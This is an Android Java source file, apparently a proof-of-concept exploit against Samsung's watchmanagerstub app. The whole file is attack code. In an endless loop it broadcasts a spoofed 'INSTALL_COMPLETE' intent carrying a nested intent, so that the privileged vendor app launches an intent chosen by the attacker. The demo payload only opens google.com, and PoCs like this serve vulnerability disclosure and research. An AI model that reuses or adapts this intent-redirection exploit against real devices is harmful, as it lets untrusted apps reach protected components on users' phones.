package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new Thread(() -> {
            Intent i = new Intent("com.samsung.android.app.watchmanagerstub.INSTALL_COMPLETE");
            i.putExtra("android.content.pm.extra.STATUS", -1);
            i.putExtra("android.intent.extra.INTENT", new Intent(Intent.ACTION_VIEW, Uri.parse("https://google.com/")));

            while (true) {
                sendBroadcast(i);
                try {
                    Thread.sleep(100);
                } catch (Throwable th) {
                    throw new RuntimeException(th);
                }
            }
        }).start();
    }
}